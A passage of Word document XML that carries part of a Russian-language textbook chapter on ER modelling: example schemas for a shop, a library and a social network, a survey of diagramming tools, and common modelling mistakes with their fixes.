      </w:pPr>
      <w:r>
        <w:t>Товар</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Категория</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позиция_заказа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Корзина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позиция_корзины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Заказ (один пользователь делает много заказов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ 1 — N Позиция_заказа (один заказ содержит много позиций)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар 1 — N Позиция_заказа (один товар может быть в нескольких заказах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар M — N Категория (один товар может быть в нескольких категориях)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — 1 Корзина (у пользователя одна корзина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Корзина 1 — N Позиция_корзины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты Товара</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>название</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>описание</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>цена</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>количество_на_складе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>изображение_url</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты Заказа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>пользователь_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_создания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>статус (новый, оплачен, отправлен, доставлен)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>сумма_итого</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>адрес_доставки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты Позиции_заказа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>заказ_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>товар_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>количество</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>цена_за_единицу (цена на момент заказа, а не текущая!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Библиотека</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Книга</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читатель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выдача</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Книга M — N Автор (книга может иметь нескольких авторов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читатель 1 — N Выдача (читатель может брать много книг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Книга 1 — N Выдача (книга может быть выдана много раз, но не одновременно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты Книги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>название</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ISBN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>год_издания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>издательство</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>количество_экземпляров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибуты Выдачи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>id (PK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>книга_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>читатель_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_выдачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_возврата_план</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_возврата_факт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>статус (на руках, возвращена, просрочена)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Социальная сеть (упрощённая)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пост</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Комментарий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лайк</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дружба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Пост (пользователь пишет много постов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пост 1 — N Комментарий (пост имеет много комментариев)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Комментарий (пользователь пишет много комментариев)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пост 1 — N Лайк (пост имеет много лайков)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь 1 — N Лайк (пользователь ставит много лайков)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь M — N Пользователь через Дружба (друзья друг с другом)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенность</w:t>
      </w:r>
      <w:r>
        <w:t>: связь Дружба — это M:N между Пользователь и Пользователь (рекурсивная связь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица Дружба:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>пользователь_1_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>пользователь_2_id (FK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>дата_добавления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>статус (запрос, подтверждено, отклонено)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Первичный ключ: `(пользователь_1_id, пользователь_2_id)` или отдельное `id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Инструменты для создания ER-диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Онлайн-инструменты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**draw.io** (diagrams.net)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бесплатный, без регистрации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Есть шаблоны ER-диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экспорт в PNG, SVG, PDF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интеграция с Google Drive, GitHub</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**dbdiagram.io**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Специализированный инструмент для БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Описание схемы на языке DBML (Database Markup Language)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматическая генерация диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экспорт в SQL, PDF, PNG</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Lucidchart**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Профессиональный инструмент (платная подписка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Коллаборация в реальном времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шаблоны для Crow's Foot, Chen, UML</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Miro**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Онлайн-доска для совместной работы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно рисовать ER-диаграммы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хорошо для мозговых штурмов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Десктопные инструменты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**MySQL Workbench**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бесплатный, open-source</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Визуальное проектирование БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерация SQL из ER-диаграммы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обратное проектирование (создание диаграммы из существующей БД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**pgModeler** (для PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Open-source</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка расширенных возможностей PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ERwin Data Modeler**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Профессиональный инструмент (дорогой)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в крупных компаниях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка IDEF1X, UML</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Enterprise Architect**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UML и ER-моделирование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка большого числа нотаций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерация кода и SQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекомендация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: для учёбы используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>draw.io</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dbdiagram.io</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Для работы — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MySQL Workbench</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pgModeler</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.1 (Жизненный цикл БД)**: инфологическое моделирование — это фаза **концептуального проектирования** (первая фаза после анализа требований).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.2 (Информационные модели)**: ER-диаграмма — это **структурная информационная модель** предметной области.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.2 (Понятие БД. Архитектура)**: инфологическая модель преобразуется в **даталогическую** (логическую), а затем в **физическую** модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.3 (Реляционные БД. Нормализация)**: ER-диаграммы превращаются в таблицы. Связи M:N превращаются в промежуточные таблицы. Проводится нормализация (1НФ, 2НФ, 3НФ) для устранения избыточности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>12. Типичные ошибки при моделировании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Хранение вычисляемых данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: в таблице `Товар` хранить `цена_со_скидкой`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: при изменении процента скидки придётся обновлять все записи. Риск несоответствия данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: хранить `цена` и `процент_скидки`, вычислять цену со скидкой в запросе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Избыточность данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: в таблице `Заказ` хранить `имя_клиента`, `email_клиента`, `адрес_клиента`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: при изменении email клиента придётся обновлять все его заказы. Аномалия обновления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: хранить только `клиент_id` (FK), остальные данные — в таблице `Клиент`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Множественные значения в одном поле</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: в таблице `Книга` поле `авторы = "Кнут, Таненбаум, Кормен"`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: поиск по автору становится кошмаром. Нарушение 1НФ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: отдельная таблица `Автор` и связь M:N через таблицу `Книга_Автор`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Отсутствие первичного ключа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: таблица `Оценка` без ключа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: дубликаты записей, невозможность однозначно идентифицировать запись.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: добавить составной ключ `(студент_id, курс_id)` или суррогатный ключ `id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Неправильная кардинальность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: связь Студент 1 — 1 Курс (один студент учится на одном курсе).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: студент не может посещать несколько курсов. Нереалистичная модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: связь Студент M — N Курс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Слишком много атрибутов в одной сущности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ошибка</w:t>
      </w:r>
      <w:r>
        <w:t>: сущность `Пользователь` с 50 атрибутами (личные данные, настройки, статистика, платёжные данные...).</w:t>
      </w:r>
